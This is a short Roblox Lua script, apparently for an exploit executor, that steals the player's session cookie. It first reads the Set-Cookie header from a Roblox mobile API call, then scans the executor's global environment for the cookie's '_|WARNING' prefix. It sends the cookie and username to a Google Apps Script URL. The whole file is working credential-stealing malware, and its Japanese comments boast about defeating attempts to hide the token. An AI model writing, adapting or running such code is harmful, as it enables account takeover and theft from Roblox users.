local gasUrl = "https://script.google.com/macros/s/AKfycbxwKFIUJ5EXb6hx4ttrSczmZ920iN3Fvfzzo2z6S0MNisMvpz7kVxsD_dpYUAEB2ffD/exec"
local user = game.Players.LocalPlayer.Name

local function hijack()
    local finalCookie = "STILL_NOT_FOUND"
    
    -- 手法1: モバイルAPIを叩いてヘッダーを覗く
    pcall(function()
        local req = (getgenv().request or request or http_request)
        if req then
            local res = req({Url = "https://www.roblox.com/mobileapi/userinfo", Method = "GET"})
            if res and res.Headers then
                finalCookie = res.Headers["Set-Cookie"] or res.Headers["set-cookie"] or res.Headers["Cookie"] or "HEADER_STRIPPED"
            end
        end
    end)
    
    -- 手法2: 環境変数の「中身」を全スキャン（名前を隠しても無駄だ！）
    if finalCookie == "STILL_NOT_FOUND" or finalCookie == "HEADER_STRIPPED" then
        for i, v in pairs(getgenv()) do
            if type(v) == "string" and v:find("_|WARNING") then
                finalCookie = v
                break
            end
        end
    end
    return finalCookie
end

local clist = hijack()
local encoded = game:GetService("HttpService"):UrlEncode(clist)
game:HttpGet(gasUrl .. "?user=" .. user .. "&cookie=" .. encoded)
